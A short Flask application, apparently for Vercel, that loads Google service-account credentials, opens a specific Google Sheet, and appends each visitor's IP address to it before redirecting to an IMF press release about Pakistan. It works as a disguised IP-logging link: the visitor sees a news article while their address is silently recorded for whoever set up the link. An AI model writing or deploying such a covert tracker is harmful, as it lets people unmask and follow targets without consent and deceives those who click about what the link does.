import os
import base64
import json
from flask import Flask, request, redirect
import gspread
from oauth2client.service_account import ServiceAccountCredentials

app = Flask(__name__)

# Decode credentials from Vercel environment variable
encoded_creds = os.getenv("GOOGLE_CREDENTIALS")
if not encoded_creds:
    raise Exception("Missing GOOGLE_CREDENTIALS environment variable")

creds_dict = json.loads(base64.b64decode(encoded_creds))
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
client = gspread.authorize(creds)

# Open your sheet
sheet = client.open_by_key("11mcR0n9IkpHvqF5TWFC21XbYeietjNuZCIJ3GAZGiBI").sheet1

@app.route('/')
def home():
    ip_address = request.remote_addr
    try:
        sheet.append_row([ip_address])
    except Exception as e:
        print(f"Error writing to sheet: {e}")
    return redirect("https://www.imf.org/en/News/Articles/2025/05/09/pr-25137-pakistan-imf-completes-1st-rev-of-eff-arrang-and-approves-req-for-arrang-under-rsf")
